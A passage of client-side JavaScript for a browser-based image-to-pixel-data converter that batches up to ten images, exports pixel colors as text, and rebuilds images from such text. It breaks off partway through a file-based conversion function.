
//HEADER TAGLINE
var headerTagline = document.querySelector(".header-tagline");
var headerProcess=document.querySelector(".header-process");
var mainContentContainer=document.querySelector(".mainContent-container");
var mainContent=document.querySelector(".mainContent");
var mainContentPlaceholder1Btn=document.querySelector(".mainContent-placeholder-1-btn");
var fileInput=document.querySelector(".mainContent-fileInput");
var root=document.querySelector(".root");


const sleep=(delay)=>new Promise((resolve)=>setTimeout(resolve, delay));

async function write() {
    var texts=[
        "Process 10 Images Up to 6000x4000 Instantly",
        "Unlimited Conversions, Forge Pixels Without Limits",
        "Batch 10 Images, Reconstruct Pixels in Seconds"
    ];
    var z=0;
    while(z<texts.length){
        var text=texts[z];
        var insert="";
        for(var i=0;i<text.length;i++){
            insert+=text[i];
            headerTagline.innerText=insert +(i<text.length-1?"|":"");
            if(text[i]=== " ")headerTagline.innerText+="\xa0";
            await sleep(150); 
        }
        await sleep(3000); 
        z=(z + 1)% texts.length;
    }
}
write();

//HEADER PROCESSTYPE

headerProcess.addEventListener("click",switchProcess=async()=>{
    if(lockProcess){return;}
    var elements=headerProcess.children;
    var mainContentPixels=document.querySelector(".mainContent-pixels");
    if(elements[0].innerText=="Image"){
        elements[0].innerText="Pixels";
        elements[2].innerText="Image";
        hideInsideBoxElements();
        mainContentPixels.style.display="flex";
        mainContentPixels.classList.add("styles");
    }else if(elements[0].innerText=="Pixels"){
        elements[0].innerText="Image";
        elements[2].innerText="Pixels"
        await showInsideBoxElements();
        mainContentPixels.style.display="none";
        var mainContentPlaceholderButton=document.querySelector(".mainContent-placeholder-1-btn").children[1];
        if(mainContentPlaceholderButton){
            mainContentPlaceholderButton.innerText="Upload Image";
        }
        var mainContentPlaceHolder=document.querySelector(".mainContent-placeholder-2");
        if(mainContentPlaceHolder){
            mainContentPlaceHolder.innerText="(You can upload upto 10 images)";
        }
    }
});


//mainContent dragging files

mainContent.classList.add("drag");

mainContentPlaceholder1Btn.addEventListener("click",()=>{
    fileInput.click();
})

var hideInsideBoxElements=()=>{
    var insideBoxElements=mainContent.children;
    for(var i=0;i<insideBoxElements.length;i++){
        insideBoxElements[i].style.display="none";
    }
}

var showInsideBoxElements=()=>{
    var insideBoxElements=mainContent.children;
    for(var i=0;i<insideBoxElements.length;i++){
        insideBoxElements[i].style.display="flex";
    }
}


mainContentPlaceholder1Btn.addEventListener("click",()=>{
    fileInput.value="";
})

var selectedFiles=[];

fileInput.addEventListener("change",(e)=>{
    selectedFiles=Array.from(e.target.files);
    handleSelectedFiles(e.target.files);
})

mainContent.addEventListener("dragover",(e)=>{
    e.preventDefault(); 
    mainContent.classList.add("drag-hover"); 
});

mainContent.addEventListener("dragleave",(e)=>{
    e.preventDefault();
    mainContent.classList.remove("drag-hover");
});

mainContent.addEventListener("drop",(e)=>{
    e.preventDefault(); 
    selectedFiles=Array.from(e.dataTransfer.files);
    if(e.dataTransfer.files.length==0){return;}
    var existingTable=mainContent.querySelector(".data-table");
    if(existingTable){
        return;
    }
    mainContent.classList.remove("drag-hover");
    const files = e.dataTransfer.files;
    if (files.length > 0) {
        handleSelectedFiles(files); 
    }
});

var lockProcess=false;

var handleSelectedFiles=async(files)=>{
    if(files.length>10){alert("You can batch only upto 10 files!");return;}
    if(headerProcess.children[0].innerText=="Image"){
    if(!checkFilesForImageToPixels(files)){alert("Please select image files only!");return;}
    lockProcess=true;
    hideInsideBoxElements();
    mainContent.classList.remove("drag");
    mainContent.classList.toggle("transform");
    var table=document.createElement("div");
    table.classList.add("data-table");
    mainContent.append(table);
    fillDataHeadings(table);
    await loadFiles(table,files);
    fillDataHeadings(table);
    for(var i=0;i<files.length;i++){
        await createRow(table,files[i],i);
    }
    alert("⚠️if the image is huge (10000x10000 pixels) then download one by one as the browser may freeze ! or shrink the pixels to reduce resolution!");
     createConvertQueue();
     appendBackContainer();
     appendConvertAllButton();
     createConvertAllFunc();
}else{
    if(!checkFilesForPixelsToImage(files)){alert("Please select txt files only!");return;}
    hideInsideBoxElements();
    mainContent.classList.remove("drag");
    mainContent.classList.toggle("transform");
    var table=document.createElement("div");
    table.classList.add("data-table");
    mainContent.append(table);
    fillDataHeadings(table);
    await loadFiles(table,files);
    fillDataHeadings(table);
    for(var i=0;i<files.length;i++){
        await createRowPixelsFile(table,files[i],i);
    }
    for(var i=0;i<files.length;i++){
        await computePixelsFromFile(files[i],i+1);
    }
    alert("To reduce the resolution, use the Image to Pixels section first and then convert that pixel data back here.The Shrink option in this section only crops the image, it doesn’t lower its resolution !");
    createConvertQueuePixel();
    appendBackContainer();
    appendConvertAllButton();
    createConvertAllPixelFunc();
}
}


var appendBackContainer=async()=>{
    var container=document.createElement("div");
    var button=document.createElement("button");
    button.innerText="/ Back";
    container.classList.add("back-container");
    button.classList.add("back");
    container.append(button);
    await root.append(container);
    var back = document.querySelector(".back");
    back.addEventListener("click",()=>{
        clicked.clear();
        clickedPixel.clear();              
        selectedFiles=[];
        clickedConvertAll=false;
        clickedConvertAllPixel=false;            
        var table=document.querySelector(".data-table");
        if(table){table.remove();}
        if(headerProcess.children[0].innerText=="Image"){
            showInsideBoxElements();
            mainContentPixels.style.display="none";
        }else{
            hideInsideBoxElements();
            mainContentPixels.style.display="flex";
        }
        lockProcess=false;
        mainContent.classList.remove("transform");
        mainContent.classList.add("drag");
        container.remove();
        var convertAllContainer=document.querySelector(".convertAll-container");
        if(convertAllContainer){convertAllContainer.remove();}
        
    })
}

var appendConvertAllButton=async()=>{
    var container=document.createElement("div");
    var button=document.createElement("button");
    button.innerText="Convert All";
    container.classList.add("convertAll-container");
    button.classList.add("convertAll");
    container.append(button);
    root.append(container);
}

var checkFilesForImageToPixels=(files)=>{
    for(let i = 0;i<files.length;i++){
        const file=files[i];
        if(file.type.startsWith("image/")){
            continue;
        }
        const ext=file.name.split('.').pop().toLowerCase();
        if (["jpg", "jpeg", "png", "gif", "bmp", "webp"].includes(ext)){
            continue;
        }else{
            return false;
        }
    }
    return true;
}

var loadFiles=async(container,files)=>{
    for(var i=0;i<files.length;i++){
        var row=document.createElement("div");
        row.classList.add("data-table-row-loader");
        row.classList.add("data-table-normal");
        var loader=document.createElement("div");
        loader.classList.add("name-loader");
        var loaderBar=document.createElement("div");
        loaderBar.classList.add("loader-bar");
        loader.append(loaderBar);
        row.append(loader);
        container.append(row);
    }
        await new Promise(resolve => setTimeout(resolve, 1700));
        container.innerHTML = "";
}

var fillDataHeadings=(container)=>{
    var columns=["Sno","Name","Shrink Pixels?","Convert type"];
    var row=document.createElement("div");
    row.classList.add("data-table-row");
    row.classList.add("data-table-header-row");
    for(var i=0;i<7;i++){
        var cell=document.createElement("div");
        row.append(cell);
        if(!columns[i]){continue;}
        cell.innerText=columns[i];
    }
    container.append(row);
}


var getImageDimensions=(file)=>{
    return new Promise((resolve,reject)=>{
        if(!file.type.startsWith("image/")){
            return resolve({imgWidth:1920,imgHeight:1080});
        }
        var image=new Image();
        image.onload=()=>{
            resolve({imgWidth:image.naturalWidth,imgHeight:image.naturalHeight});
            URL.revokeObjectURL(image.src);
        }
        image.onerror=reject;
        image.src = URL.createObjectURL(file);
    })
}

//image to pixels working

var createRow=async (container,file,k)=>{
    var {imgWidth,imgHeight}=await getImageDimensions(file);
    var row=document.createElement("div");
    row.classList.add("data-table-normal");
    row.classList.add("data-table-row");
    var sno=document.createElement("div");
    sno.innerText=(k+1)+".";
    sno.style.fontWeight="bolder"
    row.append(sno);

    var name=document.createElement("div");
    name.innerText=file.name;
    name.classList.add("data-table-name");
    name.title = file.name;
    row.append(name);

    var width=document.createElement("input");
    width.type="number";
    width.value=imgWidth;
    width.classList.add("data-table-pixel");
    var height=document.createElement("input");
    height.type="number";
    height.value=imgHeight;
    height.classList.add("data-table-pixel");
    var pixels=document.createElement("div");
    pixels.classList.add("data-table-pixels");
    pixels.append(width);
    pixels.append(height);
    row.append(pixels);

    var typeContainer=document.createElement("div");
    typeContainer.classList.add("data-table-normal");
    var rgb=document.createElement("option");
    rgb.innerText="RGB";
    var rgba=document.createElement("option");
    rgba.innerText="RGBA";
    var hsl=document.createElement("option");
    hsl.innerText="HSL";
    var hex=document.createElement("option");
    hex.innerText="HEX";
    var type=document.createElement("select");
    type.classList.add("data-table-type");
    type.append(rgb);
    type.append(rgba);
    type.append(hsl);
    type.append(hex);
    typeContainer.append(type);
    row.append(typeContainer);

    var convertContainer=document.createElement("div");
    var convert=document.createElement("button");
    convert.innerText="Convert";
    convert.classList.add("data-table-convert");
    convertContainer.append(convert);
    row.append(convertContainer);

    var downloadContainer=document.createElement("div");
    row.append(downloadContainer);
    container.append(row);
}


var smallQueue=[];
var trackFinished=[];
let clicked=new Set();
let processing=new Set();
var maxParallelWidth=2000;
var bigQueue = [];
var processingBig = false;
var processingSmall=false;

var createConvertQueue=()=>{
var convertButtons=document.querySelectorAll(".data-table-convert");


for(let i=0;i<convertButtons.length;i++){
    convertButtons[i].addEventListener("click",async()=>{
        if(clicked.has(i)){return;}
        var row=document.querySelectorAll(".data-table-row")[i+1];
        var width=parseInt(row.querySelectorAll(".data-table-pixel")[0].value);
        clicked.add(i);
        const convert = row.querySelector(".data-table-convert"); 
        convert.classList.add("loading");
        convert.innerText="Converting..."
        if(width<=maxParallelWidth){
            smallQueue.push(i);
            if(!processingBig&&!processingSmall){
                await processSmallQueue();
            }
        }else{
            bigQueue.push(i);
            if(!processingSmall&&!processingBig){
                await processBigQueue();
            }
        }

    });
}
}

var processBigQueue=async()=>{
    if(processingBig){return;}
    processingBig=true;
    while(bigQueue.length > 0){
        var idx=bigQueue.shift(); 
        await imageToPixels(idx)
    }
    processingBig=false;
    if(smallQueue.length>0){
        await processSmallQueue();
    }
}

var processSmallQueue=async()=>{
    if(processingSmall){return;}
    const promises=[];
    processingSmall=true;
    while(smallQueue.length>0){
        var idx=smallQueue.shift();
        promises.push(imageToPixels(idx));
    }
    await Promise.all(promises);
    processingSmall=false;
    if(bigQueue.length>0){
        await processBigQueue();
    }
}


const createWorkerPool = (numWorkers) => {
    const pool = [];
    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker(URL.createObjectURL(new Blob([`
            self.onmessage = function(e) {
                const { buffer } = e.data;
                const data = new Uint8ClampedArray(buffer);
                const result = new Uint8ClampedArray(data.length);
                result.set(data);
                self.postMessage({ buffer: result.buffer }, [result.buffer]);
            };
        `], { type: "application/javascript" })));
        pool.push(worker);
    }
    return pool;
};

let workerPool = null;
let conversionQueue = Promise.resolve(); 


async function imageToPixels(z) {
    conversionQueue = conversionQueue.then(() => new Promise((resolve) => {
        const rows = document.querySelectorAll(".data-table-row");
        const row = rows[z + 1];
        const inputs = row.querySelectorAll(".data-table-pixel");
        const width = parseInt(inputs[0].value);
        const height = parseInt(inputs[1].value);
        const type = row.querySelector(".data-table-type").value;
        const file = selectedFiles[z];

        const img = new Image();
        img.onload = async () => {
            const canvas = document.createElement("canvas");
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(img, 0, 0, width, height);

            const imgData = ctx.getImageData(0, 0, width, height);
            const finalBuffer = imgData.data;

            const downloadBtn = document.createElement("button");
            downloadBtn.classList.add("data-table-download");
            downloadBtn.innerText = "Download";
            row.children[5].append(downloadBtn);
            const convert = row.querySelector(".data-table-convert"); 
            convert.classList.remove("loading");
            convert.innerText="Converted"

            downloadBtn.addEventListener("click", async () => {
                downloadBtn.disabled = true;
                downloadBtn.innerText = "Downloading...";

                const tempBlobs = [];
                const CHUNK_SIZE = 1000; 
                let linesBuffer = [];

                const totalPixels = width * height;

                for (let y = 0; y < height; y++) {
                    const rowLine = [];
                    for (let x = 0; x < width; x++) {
                        const idx = (y * width + x) * 4;
                        const r = finalBuffer[idx], g = finalBuffer[idx + 1], b = finalBuffer[idx + 2], a = finalBuffer[idx + 3];
                        let val;

                        if (type === "RGB") val = `rgb(${r},${g},${b})`;
                        else if (type === "HEX") val = `#${((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1)}`;
                        else if (type === "RGBA") val = `rgba(${r},${g},${b},${a})`;
                        else if (type === "HSL") {
                            const r1 = r/255, g1 = g/255, b1 = b/255;
                            const max = Math.max(r1, g1, b1), min = Math.min(r1, g1, b1);
                            let h = 0, s = 0, l = (max + min)/2;
                            const d = max - min;
                            if(d !== 0){
                                s = l > 0.5 ? d/(2-max-min) : d/(max+min);
                                switch(max){
                                    case r1: h = (g1-b1)/d + (g1 < b1 ? 6 : 0); break;
                                    case g1: h = (b1-r1)/d + 2; break;
                                    case b1: h = (r1-g1)/d + 4; break;
                                }
                                h /= 6;
                            }
                            val = `hsl(${Math.round(h*360)},${Math.round(s*100)}%,${Math.round(l*100)}%)`;
                        }

                        rowLine.push(val);
                    }

                    linesBuffer.push(rowLine.join(","));

                    if (linesBuffer.length >= CHUNK_SIZE) {
                        tempBlobs.push(new Blob(linesBuffer.map(l=>l+"\n"), { type: "text/plain" }));
                        linesBuffer = [];
                    }
                }

                if (linesBuffer.length > 0) {
                    tempBlobs.push(new Blob(linesBuffer.map(l=>l+"\n"), { type: "text/plain" }));
                }

                const finalBlob = new Blob(tempBlobs, { type: "text/plain" });
                const link = document.createElement("a");
                link.href = URL.createObjectURL(finalBlob);
                link.download = (file?.name?.replace(/\.[^/.]+$/, "") || "output") + "_pixels.txt";
                link.click();

                downloadBtn.innerText = "Downloaded ✅";
                setTimeout(() => {
                    downloadBtn.disabled = false;
                    downloadBtn.innerText = "Download Again";
                }, 5000);
            });

            console.log("File:", file.name, "processed and ready for download!");
            resolve();
        };

        img.src = URL.createObjectURL(file);
    }));

    return conversionQueue;
}



var clickedConvertAll=false;
var createConvertAllFunc=()=>{
    var convertAll=document.querySelector(".convertAll");
    convertAll.addEventListener("click",async()=>{
        if(clickedConvertAll==false){
            convertAll.classList.add("loading");
            convertAll.innerText = "Converting...";
            for(var i=0;i<selectedFiles.length;i++){
                if(clicked.has(i)){continue;}
                var row=document.querySelectorAll(".data-table-row")[i+1];
                var width=parseInt(row.querySelectorAll(".data-table-pixel")[0].value);
                if(width<=maxParallelWidth){
                    smallQueue.push(i);
                    if(!processingBig&&!processingSmall){
                        await processSmallQueue();
                    }
                }else{
                    bigQueue.push(i);
                    if(!processingSmall&&!processingBig){
                        await processBigQueue();
                    }
                }
            }
            clickedConvertAll=true;
            convertAll.classList.remove("loading");
            convertAll.innerText = "Convert All";
        }
    })
}

//pixels to image text working

var mainContentPixels=document.querySelector(".mainContent-pixels");

var pixelsChooseText=document.querySelector(".pixels-choose-text");
var fillDataHeadingsPixelsText=(container)=>{
    var columns=["Sno","Pixel Data","Shrink Pixels?","Convert type"];
    var row=document.createElement("div");
    row.classList.add("data-table-row");
    row.classList.add("data-table-header-row");
    for(var i=0;i<7;i++){
        var cell=document.createElement("div");
        row.append(cell);
        if(!columns[i]){continue;}
        cell.innerText=columns[i];
    }
    container.append(row);
}

var createRowPixelsText=async (container,k)=>{
    var row=document.createElement("div");
    row.classList.add("data-table-normal");
    row.classList.add("data-table-row");
    var sno=document.createElement("div");
    sno.innerText=(k+1)+".";
    sno.style.fontWeight="bolder"
    row.append(sno);

    var pixelTextarea = document.createElement("textarea");
    pixelTextarea.classList.add("data-table-pixeldata");
    pixelTextarea.placeholder = "Paste pixel data here";
    pixelTextarea.title = "Paste pixel data for this conversion";
    //pixelTextarea.wrap = "off";
    row.append(pixelTextarea);

    var width=document.createElement("input");
    width.type="number";
    width.placeholder="width";
    width.classList.add("data-table-pixel");
    width.classList.add("width");
    var height=document.createElement("input");
    height.type="number";
    height.placeholder="height";
    height.classList.add("data-table-pixel");
    height.classList.add("height");
    var pixels=document.createElement("div");
    pixels.classList.add("data-table-pixels");
    pixels.append(width);
    pixels.append(height);
    row.append(pixels);

    var typeContainer=document.createElement("div");
    typeContainer.classList.add("data-table-normal");
    var png=document.createElement("option");
    png.innerText="PNG";
    var jpg=document.createElement("option");
    jpg.innerText="JPG";
    var webp=document.createElement("option");
    webp.innerText="WEBP";
    var type=document.createElement("select");
    type.classList.add("data-table-type");
    type.append(png);
    type.append(jpg);
    type.append(webp);
    typeContainer.append(type);
    row.append(typeContainer);

    var convertContainer=document.createElement("div");
    var convert=document.createElement("button");
    convert.innerText="Convert";
    convert.classList.add("data-table-convert");
    convertContainer.append(convert);
    row.append(convertContainer);

    var downloadContainer=document.createElement("div");
    row.append(downloadContainer);
    container.append(row);
}

var createRowPixelsFile=async (container,file,k)=>{
    var row=document.createElement("div");
    row.classList.add("data-table-normal");
    row.classList.add("data-table-row");
    var sno=document.createElement("div");
    sno.innerText=(k+1)+".";
    sno.style.fontWeight="bolder"
    row.append(sno);

    var name=document.createElement("div");
    name.innerText=file.name;
    name.classList.add("data-table-name");
    name.title = file.name;
    row.append(name);

    var width=document.createElement("input");
    width.type="number";
    width.placeholder="width";
    width.classList.add("data-table-pixel");
    width.classList.add("width");
    var height=document.createElement("input");
    height.type="number";
    height.placeholder="height";
    height.classList.add("data-table-pixel");
    height.classList.add("height");
    var pixels=document.createElement("div");
    pixels.classList.add("data-table-pixels");
    pixels.append(width);
    pixels.append(height);
    row.append(pixels);

    var typeContainer=document.createElement("div");
    typeContainer.classList.add("data-table-normal");
    var png=document.createElement("option");
    png.innerText="PNG";
    var jpg=document.createElement("option");
    jpg.innerText="JPG";
    var webp=document.createElement("option");
    webp.innerText="WEBP";
    var type=document.createElement("select");
    type.classList.add("data-table-type");
    type.append(png);
    type.append(jpg);
    type.append(webp);
    typeContainer.append(type);
    row.append(typeContainer);

    var convertContainer=document.createElement("div");
    var convert=document.createElement("button");
    convert.innerText="Convert";
    convert.classList.add("data-table-convert");
    convertContainer.append(convert);
    row.append(convertContainer);

    var downloadContainer=document.createElement("div");
    row.append(downloadContainer);
    container.append(row);
}

var computePixels=()=>{
    var rows=document.querySelectorAll(".data-table-row");
    for(let i=1;i<rows.length;i++){
        let pixelTextarea=rows[i].querySelector(".data-table-pixeldata");
        let widthInput=rows[i].querySelector(".width");
        let heightInput=rows[i].querySelector(".height");

        const splitTopLevelCommas = (str)=>{
            const parts=[];
            let cur="";
            let depth=0;
            for(let j=0;j<str.length;j++){
                const ch=str[j];
                if(ch==="("){
                    depth++;
                    cur+=ch;
                    continue;
                }
                if(ch===")"){
                    if(depth>0) depth--;
                    cur+=ch;
                    continue;
                }
                if(ch==="," && depth===0){
                    parts.push(cur);
                    cur="";
                    continue;
                }
                cur+=ch;
            }
            if(cur!=="") parts.push(cur);
            return parts;
        };

        pixelTextarea.addEventListener("input",()=>{
            const lines=pixelTextarea.value.trim().split("\n").filter(l=>l.trim().length>0);
            const height=lines.length;
            let width=0;
            if(lines.length>0){
                const firstLine=splitTopLevelCommas(lines[0]).map(x=>x.trim()).filter(x=>x!=="");
                width=firstLine.length;
            }
            widthInput.value=width;
            heightInput.value=height;
            if(width===0&&height===0){
                widthInput.value="";
                heightInput.value="";
            }
        });
    }
};


pixelsChooseText.addEventListener("click",async()=>{
    mainContentPixels.style.display="none";
    lockProcess=true;
    mainContent.classList.remove("drag");
    mainContent.classList.toggle("transform");
    var table=document.createElement("div");
    table.classList.add("data-table");
    mainContent.append(table);
    fillDataHeadingsPixelsText(table);
    appendBackContainer();
    for(var i=0;i<1;i++){
        await createRowPixelsText(table,i);
    }
    computePixels();
    setTimeout(() => {
        alert("⚠️If your pixel data isn’t structured properly, please enter width and height manually and To reduce the resolution, use the Image to Pixels section first and then convert that pixel data back here.The Shrink option in this section only crops the image, it doesn’t lower its resolution.");
    }, 50);
    convertSinglePixels();
})

function parsePixelColor(token) {
    token = token.trim().toLowerCase();
    if (!token) return [0, 0, 0, 255];

    // HEX format (#fff or #ffffff)
    if (token.startsWith("#")) {
        let hex = token.slice(1);
        if (hex.length === 3) hex = hex.split("").map(c => c + c).join("");
        const num = parseInt(hex, 16);
        return [(num >> 16) & 255, (num >> 8) & 255, num & 255, 255];
    }

    // RGB / RGBA format
    if (token.startsWith("rgb")) {
        const nums = token.match(/\d+(\.\d+)?/g)?.map(Number) || [0, 0, 0];
        const [r, g, b, a = 255] = nums;
        return [r, g, b, a > 1 ? a : Math.round(a * 255)];
    }

    // HSL / HSLA format
    if (token.startsWith("hsl")) {
        const nums = token.match(/\d+(\.\d+)?/g)?.map(Number) || [0, 0, 0];
        let [h, s, l, a = 100] = nums;
        s /= 100;
        l /= 100;
        const c = (1 - Math.abs(2 * l - 1)) * s;
        const x = c * (1 - Math.abs((h / 60) % 2 - 1));
        const m = l - c / 2;
        let [r1, g1, b1] = [0, 0, 0];
        if (h < 60) [r1, g1, b1] = [c, x, 0];
        else if (h < 120) [r1, g1, b1] = [x, c, 0];
        else if (h < 180) [r1, g1, b1] = [0, c, x];
        else if (h < 240) [r1, g1, b1] = [0, x, c];
        else if (h < 300) [r1, g1, b1] = [x, 0, c];
        else [r1, g1, b1] = [c, 0, x];
        return [
            Math.round((r1 + m) * 255),
            Math.round((g1 + m) * 255),
            Math.round((b1 + m) * 255),
            Math.round((a / 100) * 255)
        ];
    }

    return [0, 0, 0, 255];
}

var convertSinglePixels=()=>{
    var convertButton=document.querySelector(".data-table-convert");
    convertButton.addEventListener("click",()=>{
        pixelsToImage(1);
    });
}

var pixelsToImage = async (z) => {
    const rows = document.querySelectorAll(".data-table-row");
    const row = rows[z];
    const width = parseInt(row.querySelector(".width")?.value);
    const height = parseInt(row.querySelector(".height")?.value);
    const pixelText = row.querySelector(".data-table-pixeldata")?.value.trim();
    const outputType = (row.querySelector(".data-table-type")?.value || "png").toLowerCase();

    if (!width || !height || !pixelText) {
        alert("Enter valid width, height, and pixel data.");
        return;
    }

    const lines = pixelText.split("\n").map(l => l.trim()).filter(l => l);
    const finalBuffer = new Uint8ClampedArray(width * height * 4);

    // ✅ Universal color parser — supports rgb(), rgba(), hsl(), hsla(), #hex
    const parsePixelColor = (str) => {
        str = str.trim().toLowerCase();

        // HEX (#fff or #ffffff)
        if (str.startsWith("#")) {
            let hex = str.slice(1);
            if (hex.length === 3) {
                hex = hex.split("").map(c => c + c).join("");
            }
            const num = parseInt(hex, 16);
            return [
                (num >> 16) & 255,
                (num >> 8) & 255,
                num & 255,
                255
            ];
        }

        // RGB or RGBA
        if (str.startsWith("rgb")) {
            const nums = str.match(/[\d.]+/g)?.map(Number) || [0, 0, 0, 1];
            const [r, g, b, a = 1] = nums;
            return [r, g, b, Math.round(a * 255)];
        }

        // HSL or HSLA
        if (str.startsWith("hsl")) {
            const nums = str.match(/[\d.]+/g)?.map(Number) || [0, 0, 0, 1];
            const [h, s, l, a = 1] = nums;
            const rgb = hslToRgb(h / 360, s / 100, l / 100);
            return [...rgb, Math.round(a * 255)];
        }

        // Fallback: white
        return [255, 255, 255, 255];
    };

    const hslToRgb = (h, s, l) => {
        let r, g, b;
        if (s === 0) {
            r = g = b = l;
        } else {
            const hue2rgb = (p, q, t) => {
                if (t < 0) t += 1;
                if (t > 1) t -= 1;
                if (t < 1 / 6) return p + (q - p) * 6 * t;
                if (t < 1 / 2) return q;
                if (t < 2 / 3) return p + (q - p) * (2 / 3 - t) * 6;
                return p;
            };
            const q = l < 0.5 ? l * (1 + s) : l + s - l * s;
            const p = 2 * l - q;
            r = hue2rgb(p, q, h + 1 / 3);
            g = hue2rgb(p, q, h);
            b = hue2rgb(p, q, h - 1 / 3);
        }
        return [Math.round(r * 255), Math.round(g * 255), Math.round(b * 255)];
    };

    // Prepare preview canvas
    const canvasContainer = document.createElement("div");
    canvasContainer.classList.add("data-table-canvasContainer");
    const pCanvas = document.createElement("canvas");
    pCanvas.classList.add("data-table-canvas");
    pCanvas.width = width;
    pCanvas.height = height;
    canvasContainer.append(pCanvas);
    mainContent.append(canvasContainer);
    const ctx = pCanvas.getContext("2d");
    const imgData = ctx.createImageData(width, height);

    // Batch size for preview drawing
    let totalPixels = width * height;
    let batchSize;
    if (totalPixels <= 2_000_000) batchSize = 20;
    else if (totalPixels <= 5_000_000) batchSize = 50;
    else if (totalPixels <= 20_000_000) batchSize = 100;
    else if (totalPixels <= 70_000_000) batchSize = 250;
    else batchSize = 500;

    for (let y = 0; y < height; y++) {
        const line = lines[y] || "";
        const tokens = line.split(/\)\s*,\s*|,\s*(?=#|rgb|hsl)/).map(t => t.trim()).filter(t => t);

        for (let x = 0; x < width; x++) {
            const idx = (y * width + x) * 4;
            const token = tokens[x] || "";
            const [r, g, b, a] = parsePixelColor(token);
            imgData.data[idx] = r;
            imgData.data[idx + 1] = g;
            imgData.data[idx + 2] = b;
            imgData.data[idx + 3] = a;
        }

        if ((y + 1) % batchSize === 0 || y === height - 1) {
            ctx.putImageData(imgData, 0, 0);
            await new Promise(res => setTimeout(res, 0.001));
        }
    }

    // Full image canvas for download
    const canvas = document.createElement("canvas");
    canvas.width = width;
    canvas.height = height;
    const fullCtx = canvas.getContext("2d");
    fullCtx.putImageData(imgData, 0, 0);

    // Download button
    const cell = row.children[5];
    const downloadBtn = document.createElement("button");
    downloadBtn.classList.add("data-table-download");
    downloadBtn.innerText = "Download";
    cell.append(downloadBtn);

    downloadBtn.addEventListener("click", () => {
        downloadBtn.disabled = true;
        downloadBtn.innerText = "Preparing...";
        canvas.toBlob((blob) => {
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            const ext = outputType === "jpeg" || outputType === "jpg" ? "jpg" : outputType;
            link.download = `pixel_image.${ext}`;
            link.click();
            downloadBtn.innerText = "Downloaded ✅";
            setTimeout(() => {
                downloadBtn.disabled = false;
                downloadBtn.innerText = "Download Again";
            }, 2000);
        }, `image/${outputType}`);
    });
};


//pixels to image file working

var pixelsChooseFile=document.querySelector(".pixels-choose-file");
pixelsChooseFile.addEventListener("click",()=>{
    showInsideBoxElements();
    mainContentPixels.style.display="none";
    var mainContentPlaceHolder=document.querySelector(".mainContent-placeholder-2");
    mainContentPlaceHolder.innerText="(You can upload upto 10 txt files)";
    var mainContentPlaceholderButton=document.querySelector(".mainContent-placeholder-1-btn").children[1];
    mainContentPlaceholderButton.innerText="Upload Text Files";
    lockProcess=true;
});

var smallQueuePixel=[];
var trackFinishedPixel=[];
let clickedPixel=new Set();
let processingPixel=new Set();
var maxParallelWidthPixel=2000;
var bigQueuePixel=[];
var processingBigPixel=false;
var processingSmallPixel=false;

var checkFilesForPixelsToImage = (files) => {
    for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const ext = file.name.split('.').pop().toLowerCase();
        if (ext === "txt") {
            continue;
        } else {
            return false;
        }
    }
    return true;
};

async function computePixelsFromFile(file, index) {
    const rows = document.querySelectorAll(".data-table-row");
    const row = rows[index];
    if (!row) return;

    const widthInput = row.querySelector(".width");
    const heightInput = row.querySelector(".height");
    if (!widthInput || !heightInput) return;

    const splitTopLevelCommas = (str) => {
        const parts = [];
        let cur = "";
        let depth = 0;
        for (let j = 0; j < str.length; j++) {
            const ch = str[j];
            if (ch === "(") { depth++; cur += ch; continue; }
            if (ch === ")") { if (depth > 0) depth--; cur += ch; continue; }
            if (ch === "," && depth === 0) { parts.push(cur); cur = ""; continue; }
            cur += ch;
        }
        if (cur !== "") parts.push(cur);
        return parts;
    };

    try {
        const text = await file.text();
        const lines = text.split("\n").filter(l => l.trim().length > 0);
        const height = lines.length;

        let width = 0;
        if (lines.length > 0) {
            const firstLineTokens = splitTopLevelCommas(lines[0]);
            width = firstLineTokens.length;
        }
        if(width!=0&&height!=0){
            widthInput.value = width;
            heightInput.value = height;
        }else{
            alert("the file is too big! you can shrink the pixels in (image to pixels tab) to convert !")
            widthInput.value = "";
            heightInput.value = "";
        }
    } catch (err) {
        console.error("Error reading file:", err);
        widthInput.value = "";
        heightInput.value = "";
    }
}


async function pixelsToImageFile(z) {
    const row = document.querySelectorAll(".data-table-row")[z+1];
    if (!row) return;

    const width = parseInt(row.querySelector(".width")?.value);
    const height = parseInt(row.querySelector(".height")?.value);
    const type = row.querySelector(".data-table-type")?.value.toLowerCase() || "png";
    const file = selectedFiles[z];
    if (!width || !height || !file) {
        alert("Enter valid width, height, and select a TXT file.");
        return;
    }

    try {
        const text = await file.text();
        const lines = text.trim().split("\n");
        if (lines.length !== height) {
            alert(`TXT line count (${lines.length}) ≠ height (${height})`);
            return;
        }


        const finalBuffer = new Uint8ClampedArray(width * height * 4);


        const workerBlob = new Blob([`
            self.onmessage = function(e) {
                const { lines, width, startY } = e.data;
                const buf = new Uint8ClampedArray(width * lines.length * 4);

                const parsePixel = (token) => {
                    let r=0,g=0,b=0,a=255;
                    if(token.startsWith("rgb")) {
                        const [r1,g1,b1] = token.match(/\\d+/g).map(Number);
                        r=r1; g=g1; b=b1;
                    } else if(token.startsWith("#")) {
                        const hex = token.slice(1);
                        r=parseInt(hex.slice(0,2),16);
                        g=parseInt(hex.slice(2,4),16);
                        b=parseInt(hex.slice(4,6),16);
                    } else if(token.startsWith("rgba")) {
                        const [r1,g1,b1,a1] = token.match(/\\d+/g).map(Number);
                        r=r1; g=g1; b=b1; a=a1;
                    }
                    return [r,g,b,a];
                };

                const splitCommas = (str)=>{
                    const parts=[];
                    let cur="", depth=0;
                    for(let ch of str){
                        if(ch==="("){depth++; cur+=ch; continue;}
                        if(ch===")"){ depth--; cur+=ch; continue;}
                        if(ch==="," && depth===0){ parts.push(cur); cur=""; continue;}
                        cur+=ch;
                    }
                    if(cur) parts.push(cur);
                    return parts;
                };

                for(let y=0;y<lines.length;y++){
                    const tokens=splitCommas(lines[y]);
                    for(let x=0;x<tokens.length;x++){
                        const idx=(y*width+x)*4;
                        const [r,g,b,a]=parsePixel(tokens[x].trim());
                        buf[idx]=r; buf[idx+1]=g; buf[idx+2]=b; buf[idx+3]=a;
                    }
                }

                self.postMessage({ buffer: buf.buffer, startY }, [buf.buffer]);
            };
        `], { type: "application/javascript" });

        const NUM_WORKERS = navigator.hardwareConcurrency || 4;
